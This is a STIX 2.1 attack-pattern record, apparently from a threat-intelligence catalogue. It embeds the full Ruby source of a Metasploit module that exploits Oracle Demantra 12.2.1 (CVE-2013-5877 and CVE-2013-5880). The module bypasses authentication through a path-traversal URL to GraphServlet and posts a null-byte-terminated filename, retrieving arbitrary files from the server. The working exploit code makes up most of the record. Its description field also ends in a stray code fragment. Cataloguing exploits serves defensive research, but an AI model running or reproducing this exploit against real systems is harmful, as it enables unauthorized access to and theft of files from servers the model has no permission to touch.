{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6dc2847c-a13d-4f0d-8208-e06023c56491",
    "created": "2024-08-14T16:29:43.360553Z",
    "modified": "2024-08-14T16:29:43.36056Z",
    "name": "Oracle Demantra Arbitrary File Retrieval with Authentication Bypass",
    "description": " This module exploits a file download vulnerability found in Oracle Demantra 12.2.1 in combination with an authentication bypass. By combining these exposures, an unauthenticated user can retrieve any file on the system by referencing the full file path to any file a vulnerable machine.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/oracle_demantra_file_retrieval.rb",
            "external_id": "oracle_demantra_file_retrieval.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5880"
        },
        {
            "source_name": "reference",
            "url": "https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5877/"
        },
        {
            "source_name": "reference",
            "url": "https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle Demantra Arbitrary File Retrieval with Authentication Bypass',\n      'Description'    => %q{\n        This module exploits a file download vulnerability found in Oracle\n        Demantra 12.2.1 in combination with an authentication bypass. By\n        combining these exposures, an unauthenticated user can retrieve any file\n        on the system by referencing the full file path to any file a vulnerable\n        machine.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2013-5877'],\n          [ 'CVE', '2013-5880'],\n          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5877/'],\n          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/']\n        ],\n      'Author'         =>\n        [\n          'Oliver Gruskovnjak'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2014-02-28'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptBool.new('SSL',   [false, 'Use SSL', false]),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', 'c:/windows/win.ini'])\n      ])\n  end\n\n  def run_host(ip)\n    filename = datastore['FILEPATH']\n    authbypass = \"/demantra/common/loginCheck.jsp/../../GraphServlet\"\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(authbypass),\n      'method' => 'POST',\n      'encode_params' => false,\n      'vars_post' => {\n        'filename' => \"#{filename}%00\"\n      }\n    })\n\n    if res.nil? or res.body.empty?\n      fail_with(Failure::UnexpectedReply, \"No content retrieved from: #{ip}\")\n    end\n\n    if res.code == 404\n      print_error(\"#{rhost}:#{rport} - File not found\")\n      return\n    end\n\n    if res.code == 200\n      print_status(\"#{ip}:#{rport} returns: #{res.code.to_s}\")\n      fname = File.basename(datastore['FILEPATH'])\n      path = store_loot(\n        'oracle.demantra',\n        'application/octet-stream',\n        ip,\n        res.body,\n        fname)\n\n      print_good(\"#{ip}:#{rport} - File saved in: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-02-28"
}